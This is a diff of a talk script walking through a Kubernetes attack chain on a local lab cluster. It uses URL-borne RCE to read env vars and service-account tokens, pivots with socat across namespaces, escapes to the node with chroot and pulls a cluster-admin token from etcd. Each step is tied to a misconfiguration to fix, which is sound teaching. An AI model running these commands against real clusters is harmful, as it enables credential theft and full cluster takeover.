@@ -2,15 +2,32 @@
 
 ### STAGE 1 - COMPROMISE A POD
 
-Our starting point is that we've found a vulnerable web application on the internet with an RCE vulnerability. What can we do from here ? 
+SLIDE 3
+Our starting point is that we've found a vulnerable web application on the internet with an RCE vulnerability. 
+
+At this point all we know is that we have an app that is exposed on port 80, which we have connected to. 
+
+SLIDE 4
+
+Let's also introduce the Timeline of Doom, which will track how our exploit scope has changed over time. 
+
+What can we do from here ? 
 
 So the first thing we might be interested in is looking at the environment variables. Typically containers are configured with environment variables so this might tell us some interesting things.
 
 [ENV](http://localhost/webadmin?cmd=env)
 
-This has told us lots of interesting information. We can see we are running in a Kubernetes cluster, so we are in a container, and we can see the internal address of the API server. 
+This has told us lots of interesting information. We can see we are running in a Kubernetes cluster, so we are in a container, and we can see the internal address of the API server. From this we can also assume the pod running our application is exposing the port via a Kubernetes service. 
 
-SLIDE - Basic container, in Kubernetes cluster, with internal API
+SLIDE 5 - Pod, in Kubernetes cluster, with internal API
+
+Let's also see what we can find out about the network at this point 
+
+[IP](http://localhost/webadmin?cmd=ip%20a)
+
+So now we know what IP range our container is in. 
+
+SLIDE 6 - Add pod IP
 
 Let's see what else we can do. By default each pod in Kubernetes has a service token automounted in it, which is associated with the service account which was used to create the pod. You can control this on the service account or pod level using :
 
@@ -18,21 +35,17 @@ Let's see what else we can do. By default each pod in Kubernetes has a service t
 
 [TOKEN](http://localhost/webadmin?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)
 
-It seems our permissions will let us access that. We'll see what we can do now with this token.
+It seems our permissions will let us access that, so let's take a look at our Timeline of Doom now. 
+
+SLIDE 7
 
 It's also worth noting that these first two stages are also possible just with a directory traversal vulnerability since we can do :
 
 [ENV_DIR](http://localhost/webadmin?cmd=cat%20/proc/self/environ)
 
-Let's see what we can find out about the network at this point 
+Let's see what we can get from the internal API server using the token we just found. We're going to try to connect from the app to the internal address of the API server.
 
-[IP](http://localhost/webadmin?cmd=ip%a)
-
-So now we know what IP range our container is in. 
-
-SLIDE - Add container IP
-
-Let's see what we can get from the internal API server using the token we just found :
+SLIDE 8
 
 [API](http://localhost/webadmin?cmd=curl%20--cacert%20/var/run/secrets/kubernetes.io/serviceaccount/ca.crt%20-H%20"Authorization:%20Bearer%20$(cat%20/var/run/secrets/kubernetes.io/serviceaccount/token)"%20https://10.96.0.1/api/v1/namespaces/default/endpoints)
 
@@ -40,9 +53,11 @@ What we've done in this string is to curl the internal endpoint of the API serve
 
 This command succeeds, and in a real environment would give us the external address for the Kubernetes API server. Because we are running in Kind, it won't be this IP address, it will just be exposed on localhost with the same port. This is a vulnerability, and has been created by a too permissive policy for the service token. 
 
-SLIDE - Add external API server
+SLIDE 9 - Updated timelime
 
 Now we have a token we can configure kubectl to use that token against the external endpoint of the API server. 
+
+SLIDE 10 - connect to external API
 
 Run the helper script and configure kubectl locally in a new shell to use the token we just got. 
 
@@ -119,8 +134,11 @@ Here we can see we've got a lot more permissions. We can also show the output of
 
 So now we know we can do quite a few things in the secure namespace, and not a lot in default. This is a fairly common pattern, to give service accounts permissions in their own namespace.
 
-SLIDE - Add namespace
-SLIDE - show typical role and binding
+SLIDE 11 - Add namespaces
+
+SLIDE 12 - show typical role and binding
+
+SLIDE 13 - updated timeline to include role
 
 Let's try and get a shell on the compromised pod :
 
@@ -140,6 +158,8 @@ Test if we can create files
 `touch test`
 
 If we can do this, it potentially means we can download software or change configuration. I already know we have curl, so that's definitely possible. This is a vulnerability, caused by not setting `readonlyRootFilesystem=true`
+
+SLIDE 14 - readonly root
 
 Exit out of the container for the minute. 
 
@@ -178,8 +198,7 @@ Error from server (Forbidden): error when creating "demo_yamls/nonroot_priv.yaml
 
 Here we can see we've definitely got a PSP that's restricting us in that namespace.
 
-SLIDE - Add PSP
-SLIDE - show PSP, role etc.
+SLIDE 15 - Pod Security Policy
 
 So does that stop us from extending our exploit ? Let's try something else :
 
@@ -204,7 +223,9 @@ The problem here is that the PSP doesn't include :
 
 `allowPrivilegeEscalation=false`
 
-SLIDE - show PSP with correct privilege escalation setting
+SLIDE 16 - show PSP with correct privilege escalation setting
+
+SLIDE 17 - add PSP to timeline
 
 Lots of places on the internet say this doesn't matter if you disallow privileged and root, but this isn't true. I now have a lot more things I can do in my container. I can install software AND I can poke around in the network. 
 
@@ -251,15 +272,19 @@ Nmap done: 256 IP addresses (254 hosts up) scanned in 2.60 seconds
 
 We've now discovered another service running, which also has port 5000 open. 
 
+SLIDE 18 - still don't know which namespace this new application is in
+
+SLIDE 19 - no network controls to timeline
+
 ### STAGE 3 - ESCAPE THE NAMESPACE AND THE PSP
 
 ```console
 root@snyky:~# socat tcp-listen:5001,reuseaddr,fork tcp:10.244.1.9:5000 &
 ```
 
-SLIDE show traffic between pods
+SLIDE 20 - connect via snyky pod to new pod
 
-Now this works because there isn't a network policy stopping us from traversing between the secure namespace and other namespaces in the cluster. This is another vulnerability.
+As we already saw this works because there isn't a network policy stopping us from traversing between the secure namespace and other namespaces in the cluster. 
 
 Back to our local console :
 
@@ -275,9 +300,13 @@ Now we can switch over the token in our kubeconfig and see what we can do with t
 
 `kubectl get pods`
 
-With this token we can now view the default namespace, so we've managed to escape the secure namespace. 
+With this token we can now view the default namespace, so we've managed to escape the secure namespace.
 
-SLIDE - Add new app running in default
+`k auth can-i --list --token=$TOKEN`
+
+We can also see that we have permissions in the default namespace
+
+SLIDE 21 - Add new app running in default
 
 ### STAGE 4 - GAIN CONTROL OF THE NODE
 
@@ -301,7 +330,7 @@ chroot /chroot
 ps ax
 ```
 
-SLIDE - show host node
+SLIDE 22 - show host node
 
 ### STAGE 5 - GAIN CONTROL OVER THE CLUSTER
 
@@ -313,7 +342,7 @@ kubectl get pods -n kube-system
 kubectl get nodes
 ```
 
-SLIDE Add kube-system namespace
+SLIDE 24 kube-system namespace
 
 Note that none of our other tokens let us do this, this is the kube-system namespace where the control plane for the entire cluster is running. We can also see the nodes, which is very useful to us, and we can find out where all of our kube-system pods are running. However ...
 
@@ -334,7 +363,7 @@ Now we can run etcdclient and check if we have a connection to etcd
 
 `kubectl exec etcdclient -- etcdctl member list`
 
-SLIDE Show etcdclient pod connecting to etcd
+SLIDE 25 Show etcdclient pod connecting to etcd
 
 Etcd contains a lot of interesting information about the cluster, not least of which is secrets.
 
@@ -350,7 +379,13 @@ We have the token, what can it do ?
 
 I now have a cluster-admin token, and can do whatever I want with the cluster.
 
-SLIDE - show cluster owned
+SLIDE 26 - End of our timeline of doom
+
+SLIDE 27 - Game over
+
+SLIDE 28 - how could we have prevented
+
+SLIDE 29 - standing on the shoulders of giants
 
 
 
